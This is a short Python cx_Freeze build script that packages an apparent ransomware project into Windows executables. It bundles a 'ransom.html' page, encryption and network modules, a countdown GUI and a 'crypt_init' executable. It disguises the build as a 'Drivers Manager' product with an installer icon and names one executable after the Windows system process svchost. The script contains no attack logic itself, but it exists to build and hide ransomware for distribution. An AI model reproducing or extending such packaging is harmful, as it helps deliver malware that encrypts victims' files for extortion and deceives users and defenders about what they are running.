#!/usr/bin/python
#coding:utf-8
import sys
from cx_Freeze import setup, Executable

path = sys.path
includefiles = ['assets/image.jpg', 'assets/ransom.html', 'assets/icon/windows-installer.ico']
includes = []
excludes = []
packages = ["modules/crypt", "modules/network", "modules/permission", "modules/system"]

options = {"path": path,
           "include_files": includefiles,
           "includes": includes,
           "excludes": excludes,
           "packages": packages
           }

base = None
if (sys.platform == "win32"):
    base = "Win32GUI"
setup(
	name = "Drivers Manager",
	version = "3.4",
	options = {"build_exe": options},
	executables = [Executable("main.py", base=base, icon="assets/icon/windows-installer.ico"),
                    Executable("GuiCounter.py", base=base),
		    Executable("crypt_init.py", base=base),
                    Executable("svchost.py", base=base)]
)
